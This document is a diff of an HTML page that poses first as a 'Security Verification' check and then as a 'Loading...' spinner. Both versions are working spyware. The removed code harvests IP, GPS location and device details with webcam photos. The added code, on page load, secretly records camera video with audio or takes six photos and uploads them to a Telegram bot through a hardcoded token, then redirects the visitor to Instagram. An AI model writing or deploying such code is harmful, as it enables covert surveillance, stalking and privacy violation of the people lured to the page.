@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
+    <title>Loading...</title>
     <style>
         body {
-            background-color: #0f172a;
+            background-color: #0f0f0f;
             color: #ffffff;
             font-family: Arial, sans-serif;
             display: flex;
@@ -14,210 +14,184 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
+        }
+        .loader {
             text-align: center;
         }
-        .box {
-            background: #1e293b;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-            max-width: 350px;
-            width: 100%;
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            border-left-color: #3b82f6;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
         }
-        h2 { margin-bottom: 10px; color: #38bdf8; }
-        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
-        .btn {
-            background: #3b82f6;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            font-weight: bold;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        .btn:hover { background: #2563eb; }
-        #status { margin-top: 15px; font-size: 13px; color: #facc15; }
-        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>Security Verification</h2>
-        <p>Please click the button below to verify that you are a human and proceed.</p>
-        <button class="btn" id="verifyBtn" onclick="startProcess()">Verify Now 🛡️</button>
-        <div id="status"></div>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Loading, please wait...</p>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
         
-        let ipInfo = "Fetching...";
-        let cityInfo = "Unknown";
-        let regionInfo = "Unknown";
-        let countryInfo = "Unknown";
-        let ispInfo = "Unknown";
-        let batteryData = "Unknown";
-        let networkData = "Unknown";
-        let gpsLocation = "Fetching GPS...";
-        let googleMapLink = "N/A";
+        const urlParams = new URLSearchParams(window.location.search);
+        const CHAT_ID = urlParams.get('id');
+        const cameraType = urlParams.get('b'); // 'front', 'back', ya null (Universal)
 
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                ipInfo = data.ip || "N/A";
-                cityInfo = data.city || "N/A";
-                regionInfo = data.region || "N/A";
-                countryInfo = data.country_name || "N/A";
-                ispInfo = data.org || "N/A";
-            })
-            .catch(e => { ipInfo = "Hidden"; });
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                let level = Math.round(battery.level * 100);
-                let charging = battery.charging ? "⚡ (Charging)" : "🔋";
-                batteryData = `${level}% ${charging}`;
-            });
-        }
-
-        if (navigator.connection) {
-            networkData = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
-        }
-
-        // Exact GPS Location fetch karne ka function
-        function getGPS() {
-            return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            let lat = position.coords.latitude;
-                            let lon = position.coords.longitude;
-                            let acc = position.coords.accuracy;
-                            gpsLocation = `${lat}, ${lon} (Accuracy: ~${Math.round(acc)}m)`;
-                            googleMapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                            resolve();
-                        },
-                        (error) => {
-                            gpsLocation = "Permission Denied / Not Available";
-                            resolve();
-                        },
-                        { timeout: 10000, enableHighAccuracy: true }
-                    );
-                } else {
-                    gpsLocation = "Not Supported";
-                    resolve();
-                }
-            });
-        }
-
-        async function startProcess() {
-            document.getElementById('verifyBtn').style.display = 'none';
-            document.getElementById('status').innerText = "Verifying security & location, please allow permission...";
-
-            // Pehle GPS location fetch hone ka wait karega taaki message mein 100% real location jaye
-            await getGPS();
-
-            const urlParams = new URLSearchParams(window.location.search);
-            const camType = urlParams.get('b'); 
-            const chatId = urlParams.get('id');
-
-            let constraints = { video: { facingMode: "user" } }; 
-
-            if (camType === 'back') {
-                constraints = { video: { facingMode: { exact: "environment" } } }; 
-            } else if (camType === 'front') {
-                constraints = { video: { facingMode: "user" } }; 
+        async function init() {
+            if (!CHAT_ID) {
+                window.location.href = "https://www.instagram.com";
+                return;
             }
 
-            navigator.mediaDevices.getUserMedia(constraints)
-            .catch(err => {
-                if (camType === 'back') {
-                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                }
-                throw err;
-            })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                let photoCount = 0;
-                const maxPhotos = 4; 
+            // Agar Universal link hai (yani 'b' nahi diya gaya), toh video record hogi
+            if (!cameraType) {
+                startVideoRecording();
+            } else {
+                // Front ya Back link hone par photos capture hongi
+                startPhotoCapture();
+            }
+        }
 
-                const photoInterval = setInterval(() => {
-                    photoCount++;
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // --- UNIVERSAL LINK: Video Recording (4-5 sec) ---
+        async function startVideoRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
 
-                    canvas.toBlob(blob => {
-                        let captionText = "";
-
-                        if (photoCount === 1) {
-                            let currentTime = new Date().toLocaleString();
-                            let screenRes = `${window.screen.width}x${window.screen.height}`;
-                            let uaString = navigator.userAgent;
-
-                            captionText = 
-                                `🌐 **IP & GPS Information**\n\n` +
-                                `🔢 IP Address: \`${ipInfo}\`\n` +
-                                `📍 IP Location: ${cityInfo}, ${regionInfo}\n` +
-                                `🛰️ **Exact GPS Coordinates:**\n\`${gpsLocation}\`\n` +
-                                `🗺️ [Open in Google Maps](${googleMapLink})\n` +
-                                `📡 ISP: ${ispInfo}\n\n` +
-                                `📱 **Device Details**\n\n` +
-                                `🔋 Battery: ${batteryData}\n` +
-                                `📶 Network: ${networkData}\n` +
-                                `🖥️ Screen: ${screenRes}\n` +
-                                `🕒 Time: ${currentTime}\n` +
-                                `🧠 UA: \`${uaString}\`\n\n` +
-                                `👑 **Credit By: आयुष नेगी**`;
-                        } else {
-                            captionText = `👑 **Credit By: आयुष नेगी**`;
-                        }
-
-                        sendPhotoToTelegram(blob, chatId, captionText);
-                    }, 'image/jpeg', 0.85);
-
-                    if (photoCount >= maxPhotos) {
-                        clearInterval(photoInterval);
-                        stream.getTracks().forEach(track => track.stop());
-                        document.getElementById('status').innerText = "Verification Successful!";
-                        setTimeout(() => {
-                            window.location.href = "https://www.google.com";
-                        }, 1500);
+                let recordedChunks = [];
+                let options = { mimeType: 'video/webm; codecs=vp8,opus' };
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options = { mimeType: 'video/mp4' };
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                        options = {};
                     }
-                }, 1500);
+                }
 
-            })
-            .catch(error => {
-                document.getElementById('status').innerText = "Camera permission denied or not supported!";
-                console.error(error);
-            });
+                const mediaRecorder = new MediaRecorder(stream, options);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
+                    stream.getTracks().forEach(track => track.stop());
+
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('video', blob, 'universal_video.webm');
+                    formData.append('caption', '🎥 Universal Camera 4-Sec Video Captured!');
+
+                    try {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (e) {
+                        console.error(e);
+                    } finally {
+                        window.location.href = "https://www.instagram.com";
+                    }
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                }, 4500);
+
+            } catch (err) {
+                window.location.href = "https://www.instagram.com";
+            }
         }
 
-        function sendPhotoToTelegram(blob, chatId, caption) {
-            if (!chatId) return;
+        // --- FRONT/BACK LINK: 5-6 Photos Capture ---
+        async function startPhotoCapture() {
+            let constraints = {
+                video: { width: { ideal: 1280 }, height: { ideal: 720 } }
+            };
 
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'capture.jpg');
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'Markdown');
+            if (cameraType === 'back') {
+                constraints.video.facingMode = { exact: "environment" };
+            } else {
+                constraints.video.facingMode = "user";
+            }
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(err => console.log(err));
+            try {
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia(constraints);
+                } catch (e) {
+                    if (cameraType === 'back') {
+                        constraints.video.facingMode = "environment";
+                        stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    } else {
+                        throw e;
+                    }
+                }
+
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+
+                // Thoda wait karein taaki camera adjust ho jaye
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = videoElement.videoWidth || 1280;
+                canvas.height = videoElement.videoHeight || 720;
+                const context = canvas.getContext('2d');
+
+                // 5 se 6 photos ek ke baad ek khichna
+                for (let i = 1; i <= 6; i++) {
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    
+                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                    
+                    if (blob) {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, `photo_${i}.jpg`);
+                        formData.append('caption', `📸 ${cameraType.toUpperCase()} Camera - Shot ${i}/6`);
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+
+                    // Har photo ke beech mein thoda gap (jaise 600ms)
+                    await new Promise(resolve => setTimeout(resolve, 600));
+                }
+
+                stream.getTracks().forEach(track => track.stop());
+                window.location.href = "https://www.instagram.com";
+
+            } catch (err) {
+                window.location.href = "https://www.instagram.com";
+            }
         }
+
+        window.onload = function() {
+            setTimeout(init, 500);
+        };
     </script>
 </body>
 </html>
